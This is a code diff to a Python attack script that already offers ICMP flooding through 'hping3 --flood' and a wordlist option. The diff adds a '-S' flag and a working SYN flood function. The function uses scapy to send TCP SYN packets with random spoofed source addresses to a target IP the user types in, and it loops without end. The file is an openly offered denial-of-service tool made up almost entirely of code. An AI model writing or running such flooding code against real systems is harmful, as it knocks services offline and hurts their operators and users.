@@ -2,7 +2,9 @@ import requests
 import sys
 import os
 import time
+from scapy.all import *
 import multiprocessing
+
 
 def divide(con,n):
 	n = n/2
@@ -19,7 +21,10 @@ def divide(con,n):
 	return con,newCon
 
 def execute(flags):
-	
+	if '-S' in flags:
+			print("Syn flooding!")
+			synflood()
+				
 	if '-s' in flags:
 		direc = input("Enter the location of the wordlist, including the name of the file.\nPress enter to use default wordlist\n")
 		direc.strip()
@@ -68,6 +73,8 @@ def execute(flags):
 
 
 def run(con,t_url,flags,response):
+
+
 	if response.status_code == 200:
 		if '-i' in flags:
 				print("ICMP flooding")
@@ -94,13 +101,25 @@ def icmpflood(ip):
 	print("ICMP flooding!!!")
 	os.system("hping3 --flood ",ip);
 
-def synflood(url):
-	pass
+def synflood():
+	#To be worked on!
+	target_ip = input("Enter the IP address\n").strip()
+	dport = 80
+	sport = 1234
+	
+	while True:
+
+		s_addr = RandIP()
+		pkt = IP(src=s_addr,dst=target_ip)/TCP(sport = sport,dport=dport,seq = 1505066, flags = "S")
+		send(pkt)
+
+
+
 
 if __name__ == "__main__":
 	Uargs = sys.argv
 	Uargs.pop(0)
-	Sargs = ['-s','-i','-h','-k','-q']
+	Sargs = ['-s','-i','-h','-k','-q','-S']
 	flags = []
 
 	for i in Uargs:
@@ -110,6 +129,3 @@ if __name__ == "__main__":
 		else:
 			flags.append(i)
 	execute(flags)
-			
-
-
